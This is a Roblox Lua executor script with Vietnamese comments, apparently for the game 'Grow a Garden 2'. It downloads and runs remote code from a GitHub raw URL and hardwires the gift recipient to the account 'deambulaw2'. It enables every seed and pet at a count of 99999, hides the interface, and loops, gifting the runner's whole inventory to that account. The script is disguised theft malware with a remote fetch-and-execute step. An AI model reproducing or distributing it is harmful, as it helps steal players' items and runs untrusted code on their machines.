-- ================================================
-- Auto Gift All GAG2 - deambulaw2 - Ngầm 100% (Delta)
-- Tự động gift ALL Seeds + Pets x99999
-- Chỉ cần bật script là tự làm - Không cần bấm nút
-- ================================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local TARGET_USER = "deambulaw2"
local NOTE = "Auto Gift from " .. LocalPlayer.Name

-- Load script gốc
local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Bieoidungbuonnua/GAG-2/refs/heads/main/mail.lua")
loadstring(scriptContent)()

-- Đợi UI load xong
task.wait(2)

-- Tự động set người nhận
if recipBox then
    recipBox.Text = TARGET_USER
end

-- Tự động bật ALL Seeds + ALL Pets + số lượng 99999
if cfg then
    for name, data in pairs(cfg.Seeds or {}) do
        if type(data) == "table" then
            data.enabled = true
            data.amount = 99999
        end
    end
    for name, data in pairs(cfg.Pets or {}) do
        if type(data) == "table" then
            data.enabled = true
            data.amount = 99999
        end
    end
    saveConfig(cfg)
end

-- Ẩn UI chính hoàn toàn
task.wait(1)
if Main then
    Main.Visible = false
end

print("✅ Auto Gift All cho " .. TARGET_USER .. " x99999 đã bật - Ngầm!")

-- Tự động bắt đầu gift all ngay (loop như Start Gift ALL)
task.wait(2)

if startBtn then
    startBtn.Text = "⏹  Stop"
    startBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
    startBtn.TextColor3 = Color3.new(1,1,1)
    running = true
    setStatus("🚀 Đang gift ALL Seeds + Pets x99999 cho " .. TARGET_USER, Color3.fromRGB(255, 100, 0))
    
    -- Bắt đầu loop gift all (giữ nguyên logic của startBtn từ script gốc)
    task.spawn(function()
        while true do
            local payload = collectPayload and collectPayload() or {}
            if #payload > 0 then
                local uid = getTargetUid and getTargetUid() or nil
                if uid then
                    for _, item in ipairs(payload) do
                        print("🎁 Gifting:", item.DisplayName or item.ItemKey, "x" .. (item.Count or 1))
                    end
                    if sendOneRound then
                        sendOneRound(uid, 0, 0)
                    end
                end
            else
                print("⚠ Không còn item nào để gift hoặc đã hết.")
                task.wait(10)
                break
            end
            task.wait(1) -- Delay tránh rate limit
        end
    end)
end